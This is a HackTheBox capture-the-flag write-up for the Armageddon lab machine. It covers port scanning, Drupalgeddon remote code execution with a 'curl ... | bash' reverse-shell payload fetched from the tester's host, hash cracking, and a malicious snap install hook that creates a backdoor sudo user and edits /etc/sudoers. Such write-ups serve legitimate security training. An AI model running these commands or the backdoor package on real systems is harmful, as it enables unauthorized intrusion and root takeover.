---
title: Armageddon Writeup [HTB]
tags: [HackTheBox, snap, Drupal]
image: /assets/images/armageddon/armageddon.png
published: true
banner: true
---

Armageddon is a Linux based machine that was active since March 27th of 2021 to July 24th, on this machine we will exploit the well known Drupalgeddon vulnerability, crack the hash of the admin user of Drupal, and generate a malicious snap package that runs code when it's installed so we can access as root.

# [](#header-1)Enumeration

We start using masscan to find all the available ports and then use nmap to get more information about them.

```
masscan -e tun0 --rate=500 -p 0-65535 10.10.10.233
nmap -sC -sV -p 80,22, -Pn -o scan.txt 10.10.10.233

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Welcome to  Armageddon |  Armageddon
```

There are only two open ports, ssh and a webpage on port 80, so we check the webpage.

![](/assets/images/armageddon/webpage.png)

Checking Wappalyzer something quickly cathches our attention.

![](/assets/images/armageddon/wappalyzer.png)

# [](#header-1)Gaining Access

As soon as we see an old version of Drupal, plus recalling the name of the machine one thing comes to our mind, drupalgeddon, which is a vulnerability that would allow us to get remote command execution on the machine, there is exploit for it on Metasploit, but if you don't want to use it there are also some PoCs over internet, we are using [this](https://github.com/FireFart/CVE-2018-7600) one. Here the payload is "id" so we change it for `curl 10.10.14.205/shell.sh | bash`, on this case the machine seems to be blocked to connect to uncommon ports, so we are using port 80 for hosting our reverse shell file, also the reverse shell will connect to port 443, once we run the exploit we get a shell into the machine.

![](/assets/images/armageddon/shell1.png)

# [](#header-1)Lateral Movement

As usual we hunt for configuration files, on this case the configuration file for Drupal is located at "/var/www/html/sites/default/settings.php", there we find some credentials to access to the mysql database.

![](/assets/images/armageddon/settings.png)

The system seems somewhat hardenized, so we can't stabilyze our shell, and the output of mysql commands will only show after we exit from it, so we will have to work like that, at the end we are able to get the hash of the admin of Drupal.

![](/assets/images/armageddon/mysql.png)

After cracking it with john, we get that the password of "brucetherealadmin", is "booboo", there is also a user with the same name on the machine, and he uses the same password, so now we can connect through SSH and recover user.txt.

![](/assets/images/armageddon/shell2.png)

# [](#header-1)Privilege Escalation

We check if we can run anything with sudo.

![](/assets/images/armageddon/sudo.png)

We can install any snap package that we want, so if we can generate a package that executes any commands when it's installed we could get root access, there was a vulnerability for an older version of snap that does that, [dirty sock](https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html), it used a vulnerability to simulate to run as a user with uid=0 (root), since we can run snap install as sudo we don't neet to simulate to run as root since we will be doing that, and only need to generate the malicious snap package, to do that we execute the next commands:

```
sudo snap install --classic snapcraft
mkdir explo
cd explot
mkdir snap/hooks
touch snap/hooks/install
chmod a+x snap/hooks/install
cat > snap/hooks/install << "EOF"
useradd 5ubte -m -p '$1$123$/g/OEhhmSIgc4aBHVYEz8/' -s /bin/bash
usermod -aG sudo 5ubte
echo "dirty_sock    ALL=(ALL:ALL) ALL" >> /etc/sudoers
EOF
cat > snap/snapcraft.yaml << "EOF"
name: explo
version: '0.1' 
summary: Empty snap, used for exploit
description: |
    See https://github.com/initstring/dirty_sock

grade: devel
confinement: devmode

parts:
  my-part:
    plugin: nil
EOF
```

Since we can execute commands we could use any method to get root access, but we are following the proposed method of creating a user, adding it to sudo gruop, and allowing him to run any command with sudo, to generate the hashsed password we run `openssl passwd -1 -salt 123 hacked1234`, on this case the password will be "hacked1234". Here we find a problem, we can't create a snap package on our current system (parrot os), to solve that we go to the [docs](https://snapcraft.io/docs/build-on-lxd), and see that we can build the package on an lxd container, to do that we run the next commands as root:

```
snap install lxd
lxd init
snapcraft cleanbuild
```

After all that is done we get the file "explo_0.1_amd64.snap", now we just have to upload it, and run `sudo snap install explo_0.1_amd64.snap --dangerous --devmode`, dangerous because the package doesn't come from a trusted source, and devmode because as is explained on the exploit blog the package was created on devmode, once the package is installed we can change to our new user and run `sudo bash` to get access as root.

![](/assets/images/armageddon/root.png)